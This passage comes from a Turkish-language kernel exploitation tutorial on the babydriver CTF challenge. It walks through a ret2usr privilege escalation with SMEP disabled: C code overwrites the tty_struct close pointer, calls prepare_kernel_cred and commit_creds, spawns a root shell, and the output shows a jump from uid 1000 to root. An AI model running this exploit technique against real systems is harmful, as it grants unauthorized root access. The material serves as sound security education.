[    4.188182] RIP  [<0000000000424242>] 0x424242
[    4.188182]  RSP <ffff880002b37de8>
[    4.188182] CR2: 0000000000424242
[    4.390131] ---[ end trace 2441e1028218c078 ]---
[    4.394750] Kernel panic - not syncing: Fatal exception
```
Gördüğünüz gibi, instruction pointer `0x424242`, bu geçerli bir adres olmadığından bir page fault aldık. Ve
[page fault'a sebep olan adres CR2'ye yazıldığından](https://wiki.osdev.org/CPU_Registers_x86-64#CR2), gerçekten de bizim hatalı adresin page fault'a sebep olduğunu görebiliyoruz.

### ret2usr
Tabi rastgele bir adrese atlayıp kernel'i panikletmek, bizim için çok faydalı değil. Burada `ret2usr` tekniği devreye giriyor. Bu bölüm yeterince uzun, bu sebepten bu tekniği
kolayca uygulayabilmek için **QEMU scriptindeki SMEP bellek korumasını kapatacağız**. Bunun için `-cpu` parametresini:
```bash
-cpu kvm64,+smep
```
Bu şekilde değiştirmeniz yeterli:
```bash
-cpu kvm64
```
Sıradaki bölümde aynısını SMEP'i bypass ederek yapacağız, merak etmeyin.

ret2usr, kernel'in anlık işlemin belleğine erişebildiği gerçeğini kullanıyor. Basitçe `rip` tanımlı bir fonksiyona işaret edecek şekilde değiştirirsek, kernel her ne kadar
bu fonksiyon user sayfalarında olsa da, bu adrese erişebildiğinden bu verilen adresteki kodu çalıştıracaktır.

Bu fonksiyonumuzda, asıl amacımız kendimize root vermek olacaktır. Önceki bölümden hatırlarsanız, bunun `prepare_kernel_cred()` ve `commit_creds()` ile yapıldığını görmüştük.
Basitçe `prepare_kernel_cred(NULL)` ile bir root `cred`i oluşturup, döndürdüğü adresi saklayıp, bunu `commit_creds()`e geçersek anlık işlemin `cred`i güncellenecektir. Bu sayede
root almış oluruz.

Ve `prepare_kernel_cred()` ve `commit_creds()`in adresini `/proc/kallsyms`den öğrenebiliriz.

Hadi hepsini birleştirelim, tam exploit'in kaynak koduna [burdan ulaşabilirsiniz](../src/babydriver/exploit_no_smep.c). Sizin yeni eklediğim parçaları açıklayacağım:
```c
#define PREPARE_KERNEL_CRED 0xffffffff810a1810
#define COMMIT_CREDS        0xffffffff810a1420
```
Bunlar az önce bahsetiğimiz, ve root almak için kullanacağımız fonksiyonların adresleri.
```c
void dump(char *buf, uint64_t size) {
  for (uint64_t i = 0; i < size; i++) {
    if (i % 10 == 0)
      printf("\n%.4lu: ", i);
    printf("0x%.2x ", (uint8_t) * (buf + i));
  }
  printf("\n");
}
```
Bu basitçe okuduğumuz `buffer`ı, `tty_struct`ın içeriğini görebilmeniz adına hex olarak dump eden bir fonksiyon. Dump'da, ilk 4 byte'a bakarsanız magic'i görebilirsiniz.
```c
int fake_close() {
  void *creds = ((void *(*)(void *))PREPARE_KERNEL_CRED)(NULL);
  ((void *(*)(void *))COMMIT_CREDS)(creds);
  return 0;
}
```
Bu ret2usr tekniği ile atlayacağımız fonksiyon, bize bahsetiğimiz gibi root verecek.
```c
  ops.close = (void *)fake_close;
  printf("new close: %p\n", ops.close);
  tty->ops = (void *)&ops;

  if ((ret = write(fd2, buf, sizeof(buf))) < 0) {
    perror("write failed");
    goto done;
  }

  close(fd1);
  fd1 = -1;

  if (getuid() != 0) {
    puts("exploit failed :(");
    goto done;
  }

  puts("exploit was successful, popping a shell");
  char *args[] = {"/bin/sh", NULL, NULL};
  execve("/bin/sh", args, NULL);

  perror("execve failed");
```
`close()` çağrısı hatalı bir adrese işaret etmek yerine, artık `fake_close()` işaret ediyor, yani kernel `close()` ile `/dev/ptmx`i kapatığımızda, `fake_close()`a atlayacak.
Herşey güzel giderse, `close()`dan döndüğümüzde root olmamız lazım, bunu kontrol edip, başardıysak bir shell çalıştırarak kontrolü kendimize veriyoruz.

`/init`de yaptığımız değişikliği düzelttikten sonra exploit'imizi deneyebiliriz:
```
/ $ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
/ $ ./exploit_no_smep.elf
[    4.481204] device open
[    4.492952] device open
[    4.502867] alloc done
[    4.509631] device release

0000: 0x00 0x18 0xb9 0x02 0x00 0x88 0xff 0xff 0x20 0x9c
0010: 0xb5 0x02 0x00 0x88 0xff 0xff 0x00 0x00 0x00 0x00
...
0720: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0730: 0x00 0x00 0x00 0x00 0x00

0000: 0x01 0x54 0x00 0x00 0x01 0x00 0x00 0x00 0x00 0x00
0010: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x5f 0x9f 0x02
...
0720: 0xd0 0x9d 0x4d 0x81 0xff 0xff 0xff 0xff 0x00 0x1c
0730: 0xb4 0x02 0x00 0x88 0xff
obtained the tty_struct
new close: 0x4011e5
exploit was successful, popping a shell
/ # id
uid=0(root) gid=0(root)
/ #
```

Sıradaki bölümde, bu exploit'e SMEP'i bypass etmek için bazı eklemeler yapacağız.

---
[Önceki](kernel_adventures_2.md) | [Sonraki](babydriver.md)
